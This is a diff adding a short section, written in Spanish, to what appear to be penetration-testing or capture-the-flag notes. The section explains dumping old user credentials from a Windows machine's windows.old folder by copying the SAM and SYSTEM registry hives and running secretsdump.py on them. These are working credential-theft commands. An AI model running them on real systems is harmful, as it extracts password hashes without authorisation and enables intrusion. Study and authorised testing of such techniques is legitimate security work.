@@ -701,3 +701,10 @@ charlotte
 The command completed successfully.
 ```
 
+----
+
+## windows.old credential dumping
+- En caso de que la maquina tenga un windows.old, podemos intentar dumpear las credenciales de los usuarios que estaban en el sistema anterior.
+    - `copy C:\windows.old\Windows\System32\config\sam C:\sam.save`
+    - `copy C:\windows.old\Windows\System32\config\system C:\system.save`
+    - `secretsdump.py -sam sam.save -system system.save LOCAL`
